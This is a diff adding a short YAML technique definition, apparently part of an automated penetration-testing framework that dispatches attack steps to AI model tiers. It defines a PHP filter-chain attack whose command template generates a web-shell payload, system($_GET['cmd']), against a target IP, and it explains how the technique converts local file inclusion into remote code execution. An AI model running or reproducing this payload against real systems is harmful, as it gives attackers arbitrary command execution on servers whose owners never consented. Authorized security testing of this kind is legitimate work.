@@ -1,0 +1,16 @@
+name: php_filter_chain
+category: web
+description: PHP filter chain for arbitrary file write/RCE
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Chain PHP stream filters to generate arbitrary content via php://filter. Converts LFI (read-only) to RCE without file write. Works on PHP 7+."
